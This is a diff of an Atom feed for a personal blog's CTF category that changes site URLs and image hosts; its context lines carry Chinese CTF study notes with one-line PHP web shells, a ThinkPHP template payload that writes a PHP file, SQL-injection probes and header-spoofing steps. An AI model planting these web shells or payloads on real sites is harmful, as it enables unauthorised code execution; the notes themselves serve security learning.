@@ -1,8 +1,8 @@
 <?xml version="1.0"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
-    <id>http://example.com</id>
-    <title>Shoka • Posts by &#34;ctf&#34; category</title>
-    <link href="http://example.com" />
+    <id>https://evefortosaber.github.io</id>
+    <title>流云阁 • Posts by &#34;ctf&#34; category</title>
+    <link href="https://evefortosaber.github.io" />
     <updated>2023-03-19T11:29:17.421Z</updated>
     <category term="Notes" />
     <category term="随笔" />
@@ -10,9 +10,9 @@
     <category term="CTF" />
     <category term="DFS" />
     <entry>
-        <id>http://example.com/2023/03/19/WebSecurity/CTF/CTF%E9%A2%98%E7%9B%AE%E7%AC%94%E8%AE%B0/</id>
+        <id>https://evefortosaber.github.io/2023/03/19/WebSecurity/CTF/CTF%E9%A2%98%E7%9B%AE%E7%AC%94%E8%AE%B0/</id>
         <title>CTFNote</title>
-        <link rel="alternate" href="http://example.com/2023/03/19/WebSecurity/CTF/CTF%E9%A2%98%E7%9B%AE%E7%AC%94%E8%AE%B0/"/>
+        <link rel="alternate" href="https://evefortosaber.github.io/2023/03/19/WebSecurity/CTF/CTF%E9%A2%98%E7%9B%AE%E7%AC%94%E8%AE%B0/"/>
         <content type="html">&lt;h1 id=&#34;ctf题目笔记&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ctf题目笔记&#34;&gt;#&lt;/a&gt; CTF 题目笔记&lt;/h1&gt;
 &lt;p&gt;遇到不认识的先查，不要刻板印象或置之不理。要善于搜索资料。&lt;/p&gt;
 &lt;hr /&gt;
@@ -32,7 +32,7 @@
 &lt;p&gt;称为 SQL 注释&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/SQL%E6%B3%A8%E5%85%A5%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93.png&#34; alt=&#34;SQL&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/SQL%E6%B3%A8%E5%85%A5%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93.png&#34; alt=&#34;SQL&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Cookie 注入、Post 注入、盲注&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
@@ -50,7 +50,7 @@
 &lt;/blockquote&gt;
 &lt;h3 id=&#34;2get_post&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2get_post&#34;&gt;#&lt;/a&gt; 2.get_post&lt;/h3&gt;
 &lt;p&gt;可以通过 url 进行 get 操作，通过 hackbar 的 postpage 进行 post 操作&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;D:%5CPictures%5Cassets%E5%9B%BE%E5%BA%8A%E5%9B%BE%E7%89%87%5Cget_post.png&#34; alt=&#34;11&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://article.biliimg.com/bfs/article/5403e84f6dabc1299f173b26367b97be0f29ae9b.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
 &lt;h3 id=&#34;3backup&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3backup&#34;&gt;#&lt;/a&gt; 3.backup&lt;/h3&gt;
 &lt;p&gt;注意源码泄露问题。&lt;/p&gt;
 &lt;p&gt;可用脚本 dirsearch 进行目录扫描。&lt;/p&gt;
@@ -62,8 +62,8 @@
 &lt;p&gt;&lt;strong&gt;&amp;lt;?php system($_REQUEST[&#39;ab12&#39;]);?&amp;gt;&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;&amp;lt;?php eval($_POST[123]);?&amp;gt;&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;webshell 分别为：key，ab12,123&lt;/p&gt;
-&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;? a=fetch&amp;amp;templateFile=public/index&amp;amp;prefix=&#39;&#39;&amp;amp;content&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;php&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;file_put_contents(&#39;test.php&#39;,&#39;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;phpinfo&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&#39;)&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;php&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/yijian.png&#34; alt=&#34;yijian&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/yijjian1.png&#34; alt=&#34;yijian1&#34; /&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;? a=fetch&amp;amp;templateFile=public/index&amp;amp;prefix=&#39;&#39;&amp;amp;content&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;php&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;file_put_contents(&#39;test.php&#39;,&#39;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;phpinfo&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&#39;)&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;php&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/yijian.png&#34; alt=&#34;yijian&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main//yijjian1.png&#34; alt=&#34;yijian1&#34; /&gt;&lt;/p&gt;
 &lt;h3 id=&#34;6php伪协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#6php伪协议&#34;&gt;#&lt;/a&gt; 6.PHP 伪协议&lt;/h3&gt;
 &lt;p&gt;需要开启 allow_url_fopen 的: php://stdin、php://memory、php://temp&lt;/p&gt;
 &lt;p&gt;不需要开启 allow_wrl_fopen 的：php://filter&lt;/p&gt;
@@ -78,11 +78,11 @@
 &lt;hr /&gt;
 &lt;h4 id=&#34;直接注&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#直接注&#34;&gt;#&lt;/a&gt; 直接注&lt;/h4&gt;
 &lt;p&gt;首先吗看题&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/easysql1.jpg&#34; alt=&#34;easysql1&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/easysql1.jpg&#34; alt=&#34;easysql1&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;然后寻找注入点，先试试 &lt;code&gt;&#39;,&amp;quot;,&#39;),&amp;quot;)&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;然后回显不是 “无” 就是 Nonono.&lt;/p&gt;
 &lt;p&gt;在用字符，和整数试试。发现字符时无回显，整数时有！！&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/easysql2.jpg&#34; alt=&#34;easysql2&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/easysql2.jpg&#34; alt=&#34;easysql2&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;这是一个表结构！！&lt;/p&gt;
 &lt;p&gt;再审题，发现他说” 查询 “？怀疑这是个内嵌的后端查询，就是说它的&lt;strong&gt;源码&lt;/strong&gt;可能是&lt;/p&gt;
 &lt;p&gt;&lt;code&gt; select $_POST[&#39;query&#39;] from xxx&lt;/code&gt;&lt;/p&gt;
@@ -170,9 +170,9 @@
 &lt;p&gt;试试，直接注，找到提示表，查询到 flag。&lt;/p&gt;
 &lt;h3 id=&#34;13http&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#13http&#34;&gt;#&lt;/a&gt; 13.HTTP&lt;/h3&gt;
 &lt;p&gt;打开靶场，查看源码。&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/aaahtp.jpg&#34; alt=&#34;http_1&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/aaahtp.jpg&#34; alt=&#34;http_1&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;进入 secret.php 发现如下&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/ahttp_1.jpg&#34; alt=&#34;ahttp_1&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/ahttp_1.jpg&#34; alt=&#34;ahttp_1&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;此处是一个对报文来源的要求，用 burp 抓包，&lt;strong&gt;修改来源，发现没有 Referer，手动添加到 upgrade 上，或 cookie 上，内容 &lt;code&gt;Referer: https://Sycsecret.buuoj.cn&lt;/code&gt; &lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;再发送。得到 Response，要求用 &amp;quot;Syclover&amp;quot; 浏览器，&lt;strong&gt;在 User-Agent 中修改，Firefox 为 Syclover。&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;再发送。得到 Response，&lt;strong&gt;&amp;quot;Read this locally!&amp;quot;&lt;/strong&gt;，在 upgrade 上加一行 ** &lt;code&gt;X-Forwarded-For: 127.0.0.1&lt;/code&gt; .**&lt;/p&gt;
@@ -214,10 +214,10 @@
 &lt;/blockquote&gt;
 &lt;p&gt;对网站备份扫描 *&amp;quot;&amp;quot;E:\burpsuite\ 备份扫描.py&amp;quot;&amp;quot;* 使用 Python 脚本.&lt;/p&gt;
 &lt;p&gt;得到 www.zip&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/1_16_01.png&#34; alt=&#34;01&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/1_16_01.png&#34; alt=&#34;01&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;查看三个 PHP 文件.&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/1_16_02.jpg&#34; alt=&#34;02&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/1_16_03.jpg&#34; alt=&#34;03&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/1_16_02.jpg&#34; alt=&#34;02&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main//1_16_03.jpg&#34; alt=&#34;03&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;跟据代码，思路大致为&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;利用 get 方法传参 select，select 要序列化。&lt;/p&gt;
@@ -247,7 +247,7 @@
 &lt;p&gt;3.md5&lt;/p&gt;
 &lt;p&gt;4.ROT13 旋转加密&lt;/p&gt;
 &lt;h3 id=&#34;1password&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1password&#34;&gt;#&lt;/a&gt; 1.PASSWORD&lt;/h3&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/image-20220930164451487.png&#34; alt=&#34;image-20220930164451487&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/image-20220930164451487.png&#34; alt=&#34;image-20220930164451487&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;就是猜。。。&lt;/p&gt;
 &lt;p zs19900315=&#34;&#34;&gt;flag&lt;/p&gt;
 &lt;blockquote&gt;
@@ -259,7 +259,7 @@
 &lt;p Caesar_variation=&#34;&#34;&gt;flag&lt;/p&gt;
 &lt;p&gt;&lt;em&gt;凯撒加密，即将原私钥通过 ASCII 移位的方式加密。&lt;/em&gt;&lt;/p&gt;
 &lt;p&gt;得到密文。可能每处移位的不一样。&lt;/p&gt;
-&lt;p&gt;这里是&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/image-20220930170155624.png&#34; alt=&#34;image-20220930170155624&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里是&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/image-20220930170155624.png&#34; alt=&#34;image-20220930170155624&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;afZ_r9VYfScOeO_UL^RWUc&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;根据格式，对前 5 位，按照 ASCII 表解密为&lt;strong&gt; flag {&lt;/strong&gt;，从而推出加密规律。&lt;/p&gt;
 &lt;p&gt;udf 提权，mof 提权&lt;/p&gt;
@@ -272,9 +272,9 @@
         <updated>2023-03-19T11:29:17.421Z</updated>
     </entry>
     <entry>
-        <id>http://example.com/2023/03/19/WebSecurity/CTF/%E5%AD%A6%E4%B9%A0SQL/</id>
+        <id>https://evefortosaber.github.io/2023/03/19/WebSecurity/CTF/%E5%AD%A6%E4%B9%A0SQL/</id>
         <title>SQL注入</title>
-        <link rel="alternate" href="http://example.com/2023/03/19/WebSecurity/CTF/%E5%AD%A6%E4%B9%A0SQL/"/>
+        <link rel="alternate" href="https://evefortosaber.github.io/2023/03/19/WebSecurity/CTF/%E5%AD%A6%E4%B9%A0SQL/"/>
         <content type="html">&lt;p&gt;作为刚入门时，初步接触 SQL 所作的笔记&lt;/p&gt;
 &lt;hr /&gt;
 &lt;h1 id=&#34;sql注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql注入&#34;&gt;#&lt;/a&gt; SQL 注入&lt;/h1&gt;
